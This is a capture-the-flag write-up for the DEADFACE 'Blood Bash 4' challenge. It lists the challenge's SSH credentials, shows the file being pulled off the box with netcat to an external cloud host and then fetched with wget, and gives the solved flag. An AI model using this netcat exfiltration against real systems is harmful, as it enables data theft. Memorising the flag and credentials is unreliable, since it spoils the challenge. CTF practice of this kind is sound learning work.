# [05 - Blood_Bash_4](https://deadface.ctfd.io/challenges#Blood%20Bash%204-16)

## description
```
A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they're creating for their consumers. Read the contents of the file and return the flag as flag{flag_goes_here}.

Username: bl0ody_mary
Password: d34df4c3
bloodbash.deadface.io:22
```

## walkthrough

ok, so this has to be retrieval of

```
bl0ody_mary@3f511992bc19:~$ ls -l
-rw-r--r-- 1 bl0ody_mary bl0ody_mary    12444 Sep 14 20:20 'De Monne Customer Portal.pdf'
```

when we try, currently

```
$ scp bl0ody_mary@bloodbash.deadface.io:*.pdf .
bl0ody_mary@bloodbash.deadface.io's password:
the input device is not a TTY
```

was considering `nc` exfil, but don't have a publically accessible IP, so tried to solve with some `.bash_profile` and `.bashrc` checks, `[ "$PS1" == "" ] return;`, to no avail.

spinning up something on GCP


in their machine
```
bl0ody_mary@3f511992bc19:~$ nc -z -v 34.127.24.164 80
Connection to 34.127.24.164 80 port [tcp/*] succeeded!
l0ody_mary@3f511992bc19:~$ nc -w 3 34.127.24.164 80 < 'De Monne Customer Portal.pdf'
```

on GCP
```
conor@bastion:~$ sudo nc -l -v -p 80
listening on [any] 80 ...
164.90.158.159: inverse host lookup failed: Unknown host
connect to [10.138.0.3] from (UNKNOWN) [164.90.158.159] 58962
conor@bastion:~$ sudo nc -l -v -p 80 > foo.pdf
listening on [any] 80 ...
164.90.158.159: inverse host lookup failed: Unknown host
connect to [10.138.0.3] from (UNKNOWN) [164.90.158.159] 58964
conor@bastion:~$ ls -l
total 16
-rw-r--r-- 1 conor conor 12444 Oct 16 01:46 foo.pdf
```

on pride
```
$ wget http://34.127.24.164/foo.pdf
--2021-10-15 19:49:52--  http://34.127.24.164/foo.pdf
Connecting to 34.127.24.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12444 (12K) [application/pdf]
Saving to: ‘foo.pdf’

foo.pdf                                    100%[========================================================================================>]  12.15K  --.-KB/s    in 0.005s

2021-10-15 19:49:52 (2.42 MB/s) - ‘foo.pdf’ saved [12444/12444]


```

opening the PDF, see the flag

## flag
```
flag{deM0nn3_dat4_4_us}
```
